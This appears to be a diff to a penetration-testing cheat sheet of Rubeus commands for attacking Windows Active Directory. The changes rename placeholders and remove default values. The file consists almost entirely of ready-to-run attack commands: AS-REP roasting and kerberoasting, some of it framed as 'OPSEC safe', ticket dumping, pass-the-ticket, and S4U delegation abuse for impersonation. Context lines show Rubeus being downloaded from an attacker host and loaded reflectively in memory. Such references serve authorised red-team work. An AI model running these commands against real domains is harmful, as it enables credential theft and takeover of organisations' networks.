@@ -35,13 +35,13 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## check ASPREPRoast for all users in current domain
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe asreproast  /format:<AS_REP_response_format> /outfile:<output_hashes_file>
+.\Rubeus.exe asreproast  /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
 ```
 
 ## ASREPRoast specific user
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe asreproast  /user:<user> /domain:<domain_name> /format:<AS_REP_response_format> /outfile:<output_hashes_file>
+.\Rubeus.exe asreproast  /user:<user> /domain:<domain> /format:<AS_REP_response_format|hashcat> /outfile:<output_hashes_file>
 ```
 
 ## kerberoasting - current domain
@@ -53,31 +53,31 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## Kerberoasting and outputting on a file with a spesific format
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name>
+.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain>
 ```
 
 ## Kerberoasting while being "OPSEC" safe, essentially while not try to roast AES enabled accounts
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /rc4opsec
+.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /rc4opsec
 ```
 
 ## Kerberoast AES enabled accounts
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /aes
+.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /aes
 ```
  
 ## Kerberoast specific user account
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT  
 ```cmd
-.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain_name> /user:<user> /simple
+.\Rubeus.exe kerberoast /outfile:<output_TGSs_file> /domain:<domain> /user:<user> /simple
 ```
 
 ## get hash
 #plateform/windows #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```cmd
-.\Rubeus.exe hash /user:<user> /domain:<domain_name> /password:<password>
+.\Rubeus.exe hash /user:<user> /domain:<domain> /password:<password>
 ```
 
 ## dump - will dump any relevant cached TGS ticket’s stored
@@ -89,7 +89,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## ask and inject ticket
 #plateform/windows #target/remote #cat/ATTACK/CONNECT 
 ```
-.\Rubeus.exe asktgt /user:<user> /domain:<domain_name> /rc4:<ntlm_hash> /ptt
+.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<ntlm_hash> /ptt
 ```
 
 ## S4U - with ticket - Constrained delegation
@@ -101,7 +101,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## S4U - with hash - Constrained delegation
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
-.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain_name> /ptt
+.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:ldap/<domain_fqdn> /altservice:cifs /domain:<domain> /ptt
 ```
 
 ## get rc4 of machine with the password
@@ -113,7 +113,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<lhost>/Rubeus.ex
 ## S4U - Resource based constrained delegation
 #plateform/windows #target/remote #cat/ATTACK/EXPLOIT 
 ```
-.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain_name> /ptt
+.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:cifs/<domain_fqdn> /domain:<domain> /ptt
 ```
 
 ## Rubeus Reflection assembly
@@ -131,7 +131,4 @@ $assem = [System.Reflection.Assembly]::Load($data)
 
 ```
 
-= ticket : c:\Temp\ticket.kirbi
-= domain_fqdn : MYDC.mydomain.local
-= domain_name : mydomain.local
-= AS_REP_response_format : hashcat
+
